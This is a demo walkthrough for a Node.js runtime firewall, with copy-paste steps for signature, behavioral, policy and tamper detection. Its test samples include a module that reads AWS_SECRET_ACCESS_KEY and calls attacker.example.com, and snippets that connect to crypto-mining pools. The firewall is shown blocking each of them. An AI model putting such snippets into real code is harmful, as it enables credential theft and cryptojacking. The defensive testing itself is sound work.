# Aletheia Firewall — Runnable Demo

Copy-paste walkthrough from a fresh clone. Takes about 2 minutes.

## Prerequisites

- Node.js >= 18
- Git

## Setup

```bash
git clone https://github.com/holeyfield33-art/runtime-firewall-mvp
cd runtime-firewall-mvp
npm install
```

## 1. Signature detection — crypto-miner payload

```bash
cat > /tmp/miner.js << 'EOF'
// Simulated supply-chain payload: stratum mining pool connection
const net = require('net');
net.createConnection(3333, 'pool.hashvault.pro');
EOF

FW_ENABLE_DETECTION=1 node --require ./packages/fw-agent /tmp/miner.js
```

Expected output:

```
[COMPILATION LOCKDOWN] /tmp/miner.js blocked (sig: pool.hashvault)
```

The process exits before the module runs. The event is written to the audit log.

## 2. Behavioral detection — credential exfiltration

```bash
cat > /tmp/exfil.js << 'EOF'
// Reads env credentials then phones home
const val = process.env.AWS_SECRET_ACCESS_KEY;
require('https').request({ hostname: 'attacker.example.com' }).end();
EOF

FW_ENABLE_DETECTION=1 FW_ENABLE_BEHAVIORAL=1 node --require ./packages/fw-agent /tmp/exfil.js
```

Expected output:

```
[COMPILATION LOCKDOWN] /tmp/exfil.js blocked (behavioral: CREDENTIAL_EXFILTRATION, severity: CRITICAL)
```

## 3. Sub-512-byte payload (no scan-skip)

A common evasion technique is keeping the payload under a previous size threshold.
The v0.1.0 sub-512B scan-skip (F-01) has been removed; all non-empty modules are
scanned regardless of size.

```bash
# This payload is ~90 bytes but still triggers the signature scanner
python3 -c "print('x' * 1)" > /tmp/tiny_miner.js
printf 'const s = require("net").createConnection(3333,"stratum+tcp://pool.minergate.com");\n' >> /tmp/tiny_miner.js

FW_ENABLE_DETECTION=1 node --require ./packages/fw-agent /tmp/tiny_miner.js
```

Expected output:

```
[COMPILATION LOCKDOWN] /tmp/tiny_miner.js blocked (sig: stratum)
```

## 4. Policy file — BLOCK and QUARANTINE

```bash
# Author a rules file, then SIGN it into policy.signed.json (an unsigned file fails
# verification and triggers emergency lockdown). The dev key requires FW_ALLOW_DEV_POLICY_KEY=1.
echo '{ "untrusted.js": "QUARANTINE", "evil.js": "BLOCK" }' > rules.json
node scripts/sign-policy.js scripts/dev-private-key.pem rules.json policy.signed.json

# BLOCK: module never executes
cat > /tmp/evil.js << 'EOF'
console.log("I should never run");
EOF

FW_ENABLE_DETECTION=1 FW_ALLOW_DEV_POLICY_KEY=1 node --require ./packages/fw-agent /tmp/evil.js
# Expected: [Firewall] Compilation denied for module: "evil.js"

# QUARANTINE: module is replaced with a logging Proxy
cat > /tmp/untrusted.js << 'EOF'
module.exports = { steal: () => "stealing secrets" };
EOF

cat > /tmp/app.js << 'EOF'
const m = require('/tmp/untrusted.js');
console.log(m.steal());
EOF

FW_ENABLE_DETECTION=1 FW_ALLOW_DEV_POLICY_KEY=1 node --require ./packages/fw-agent /tmp/app.js
# Expected: [Quarantine Intercept] warning; m.steal() returns null, not "stealing secrets"

rm -f policy.signed.json rules.json
```

## 5. Policy tamper detection

```bash
# Start from a validly signed (empty-rules) policy.
echo '{}' > rules.json
node scripts/sign-policy.js scripts/dev-private-key.pem rules.json policy.signed.json

FW_ENABLE_DETECTION=1 FW_ALLOW_DEV_POLICY_KEY=1 node --require ./packages/fw-agent -e "
  // Overwriting the signed file with an unsigned/tampered one makes the next 60s watcher
  // tick fail signature verification → emergency lockdown (all module loads throw).
  const fs = require('fs');
  fs.writeFileSync('policy.signed.json', JSON.stringify({ rules: { '*': 'ALLOW' } }));
  console.log('Policy watcher started. Tamper detection active (60s interval).');
  process.exit(0);
"
rm -f policy.signed.json rules.json
```

## 6. Audit log

All events are written as JSON lines to `/var/log/helios/audit.log`
(or `$TMPDIR/helios/audit.log` if `/var/log/helios` is not writable):

```bash
FW_ENABLE_DETECTION=1 node --require ./packages/fw-agent /tmp/miner.js 2>/dev/null || true
cat "${TMPDIR:-/tmp}/helios/audit.log" 2>/dev/null || cat /var/log/helios/audit.log
```

Each line is a JSON object with `type`, `module`, `reason`, `severity`, and `timestamp`.

## 7. Run the adversarial test suite

```bash
npm run test:adversarial
# Expected: all cases pass (Results: N passed, 0 failed)
```

## Known limitations

See [`docs/THREAT-COVERAGE.md`](THREAT-COVERAGE.md) for the authoritative, test-backed matrix of
what is protected and what remains a bypass (bracket/string-concat/variable-alias/prototype-chain
eval, dependency `postinstall` hooks). The former sub-100B and inline-require gaps have been fixed
(F-07 / F-08).
